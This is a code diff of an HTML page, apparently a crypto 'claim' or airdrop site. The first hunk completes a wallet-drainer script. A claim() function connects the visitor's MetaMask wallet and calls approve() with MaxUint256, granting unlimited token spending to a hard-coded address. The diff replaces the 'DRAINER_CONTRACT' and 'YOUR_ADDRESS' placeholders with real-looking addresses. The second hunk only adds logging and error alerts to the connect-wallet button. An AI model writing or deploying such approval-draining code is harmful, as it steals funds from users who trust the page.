@@ -326,22 +326,21 @@
   async function claim() {
     if (typeof window.ethereum !== "undefined") {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = await provider.send("eth_requestAccounts", []);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+
       const contract = new ethers.Contract(
-        "0xDRAINER_CONTRACT",  // Replace
+        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb",
         ["function approve(address,uint256) external returns (bool)"],
-        provider.getSigner()
+        signer
       );
 
-      await contract.approve("0xYOUR_ADDRESS", ethers.constants.MaxUint256);
+      await contract.approve("0xd58cd540Da1b043180fBF7Dd35D587210d3C9183", ethers.constants.MaxUint256);
     } else {
       alert("MetaMask not detected");
     }
   }
-</script>
-
-
-          
+</script>          
         </div>
       </div>
     </div>
@@ -409,22 +408,24 @@
   </footer>
 
   
-  <script>
+<script>
   const connectBtn = document.querySelector('.connect-wallet');
+
   connectBtn.addEventListener('click', async () => {
     if (typeof window.ethereum !== 'undefined') {
       try {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        console.log("Connected wallet:", accounts[0]);
         connectBtn.textContent = "Wallet Connected";
       } catch (err) {
-        console.error('Connection rejected:', err);
+        console.error("Connection failed:", err.message || err);
+        alert("Connection failed: " + (err.message || "unknown error"));
       }
     } else {
-      alert("MetaMask not detected");
+      alert("MetaMask not detected. Please install it.");
     }
   });
-  </script>
-
+</script>
   
 </body>
 </html>
